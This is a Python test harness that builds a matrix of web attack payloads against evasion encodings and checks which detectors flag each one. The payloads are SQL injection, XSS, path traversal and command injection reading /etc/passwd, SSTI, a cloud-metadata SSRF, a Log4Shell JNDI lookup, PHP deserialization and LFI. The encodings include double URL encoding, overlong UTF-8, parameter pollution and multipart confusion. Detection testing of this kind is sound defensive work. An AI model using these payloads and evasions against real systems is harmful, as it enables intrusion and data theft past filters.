"""Payload class x evasion technique matrix (engine level). Output: matrix.md / matrix.json in MYDIR."""
import sys, json, base64, random
sys.path.insert(0, sys.argv[1])
from harness import *
from urllib.parse import quote
random.seed(7)
q = lambda s: quote(s, safe="")
P = {  # class -> (expected detector, payload)
 "sqli": ("web.sqli", "1' UNION SELECT username,password FROM users--"),
 "xss": ("web.xss", "<img src=x onerror=alert(document.domain)>"),
 "traversal": ("web.path_traversal", "../../../../etc/passwd"),
 "cmdi": ("web.cmd_injection", "127.0.0.1;cat /etc/passwd"),
 "ssti": ("web.ssti", "{{self.__init__.__globals__.__builtins__}}"),
 "ssrf": ("web.ssrf", "http://169.254.169.254/latest/meta-data/iam/"),
 "log4shell": ("web.log4shell", "${jndi:ldap://x.example/a}"),
 "deser_php": ("web.deserialization", 'O:8:"Exploit":1:{s:3:"cmd";s:2:"id";}'),
 "lfi_wrapper": ("web.lfi_rfi", "php://filter/convert.base64-encode/resource=index.php"),
}
def pct_u(s): return "".join(c if c.isalnum() else "%%u%04x" % ord(c) for c in s)
def overlong(s): return "".join(c if c.isalnum() or ord(c)>=0x80 else "%%%02X%%%02X" % (0xC0 | (ord(c) >> 6), 0x80 | (ord(c) & 0x3F)) for c in s)
def fullwidth(s): return q("".join(chr(ord(c) + 0xFEE0) if 0x21 <= ord(c) <= 0x7E and not c.isalnum() else c for c in s))
def html_dec(s): return q("".join(c if c.isalnum() else "&#%d;" % ord(c) for c in s))
def html_nosemi(s): return q("".join(c if c.isalnum() else "&#x%x" % ord(c) for c in s))
def html_named(s): return q(s.replace("<", "&lt;").replace(">", "&gt;").replace("'", "&apos;").replace('"', "&quot;"))
def rcase(s): return q("".join(c.upper() if random.random() < .5 else c.lower() for c in s))
def ws_tab(s): return q(s.replace(" ", "\t"))
def ws_vt(s): return q(s).replace("%20", "%0B")
def ws_nbsp(s): return q(s).replace("%20", "%A0")
def ws_comment(s): return q(s.replace(" ", "/**/"))
def b64(s): return q(base64.b64encode(s.encode()).decode())
def nenc(s, n):
    for _ in range(n): s = q(s)
    return s
T = {
 "plain(1x url)": lambda s: ("/search?q=" + q(s), {}),
 "url 2x": lambda s: ("/search?q=" + nenc(s, 2), {}),
 "url 3x": lambda s: ("/search?q=" + nenc(s, 3), {}),
 "url 4x": lambda s: ("/search?q=" + nenc(s, 4), {}),
 "%uXXXX": lambda s: ("/search?q=" + pct_u(s), {}),
 "overlong utf8": lambda s: ("/search?q=" + overlong(s), {}),
 "fullwidth": lambda s: ("/search?q=" + fullwidth(s), {}),
 "html &#dd;": lambda s: ("/search?q=" + html_dec(s), {}),
 "html &#xh (no ;)": lambda s: ("/search?q=" + html_nosemi(s), {}),
 "html named": lambda s: ("/search?q=" + html_named(s), {}),
 "random case": lambda s: ("/search?q=" + rcase(s), {}),
 "ws tab": lambda s: ("/search?q=" + ws_tab(s), {}),
 "ws %0b": lambda s: ("/search?q=" + ws_vt(s), {}),
 "ws %a0": lambda s: ("/search?q=" + ws_nbsp(s), {}),
 "ws /**/": lambda s: ("/search?q=" + ws_comment(s), {}),
 "base64 param": lambda s: ("/search?q=" + b64(s), {}),
 "json body": lambda s: ("/api", dict(method="POST", ct="application/json", body=json.dumps({"q": s}))),
 "json \\u escapes": lambda s: ("/api", dict(method="POST", ct="application/json", body='{"q":"' + "".join(c if c.isalnum() else "\\u%04x" % ord(c) for c in s) + '"}')),
 "json nested string": lambda s: ("/api", dict(method="POST", ct="application/json", body=json.dumps({"data": json.dumps({"q": s})}))),
 "json 128 leaves first": lambda s: ("/api", dict(method="POST", ct="application/json", body=json.dumps({"x": [""] * 128, "q": s}))),
 "json key": lambda s: ("/api", dict(method="POST", ct="application/json", body=json.dumps({s: "1"}))),
 "json utf-16 body": lambda s: ("/api", dict(method="POST", ct="application/json", body=json.dumps({"q": s}).encode("utf-16-le"))),
 "graphql variables": lambda s: ("/graphql", dict(method="POST", ct="application/json", body=json.dumps({"query": "query($q:String){search(q:$q){id}}", "variables": {"q": s}}))),
 "multipart": lambda s: ("/upload", dict(method="POST", ct="multipart/form-data; boundary=BB", body="--BB\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n" + s + "\r\n--BB--\r\n")),
 "multipart xboundary confusion": lambda s: ("/upload", dict(method="POST", ct="multipart/form-data; xboundary=ZZ; boundary=BB", body="--BB\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n" + s + "\r\n--BB--\r\n")),
 "xml element": lambda s: ("/api", dict(method="POST", ct="application/xml", body="<r><q>" + s.replace("&", "&amp;").replace("<", "&lt;") + "</q></r>")),
 "header Referer": lambda s: ("/", dict(headers={"referer": "https://app.lab/?q=" + s})),
 "header X-Forwarded-Host": lambda s: ("/", dict(headers={"x-forwarded-host": s})),
 "custom header X-Tenant-Id": lambda s: ("/", dict(headers={"x-tenant-id": s})),
 "path segment": lambda s: ("/item/" + q(s).replace("%2F", "/"), {}),
 "path ;matrix param": lambda s: ("/search;q=" + q(s), {}),
 "HPP split (ASP.NET join)": lambda s: ("/search?" + "&".join("q=" + q(p) for p in [s[: len(s) // 2], s[len(s) // 2 :]]), {}),
 "after 8192 chars same param": lambda s: ("/api", dict(method="POST", ct="application/json", body=json.dumps({"q": "A" * 8200 + " " + s}))),
}
res, rows = {}, []
hdr = "| technique | " + " | ".join(P) + " |"
rows += [hdr, "|" + "---|" * (len(P) + 1)]
for tn, tf in T.items():
    cells = []
    for cn, (exp, pay) in P.items():
        tgt, kw = tf(pay)
        ids = web(run([direct_event(tgt, **kw)])[0])
        mark = "W" if exp in ids else ("w" if any(i.startswith("web.") for i in ids) else ("S" if ids else "-"))
        res[f"{tn}|{cn}"] = ids
        cells.append(mark)
    rows.append(f"| {tn} | " + " | ".join(cells) + " |")
legend = "\nLegend: W=expected web.* detector fired, w=other web.* detector only, S=Sigma only, -=nothing. Mode: direct (event as sent; no Gate redaction).\n"
open(f"{sys.argv[1]}/matrix.md", "w").write("\n".join(rows) + legend)
json.dump(res, open(f"{sys.argv[1]}/matrix.json", "w"), indent=1)
print("\n".join(rows))
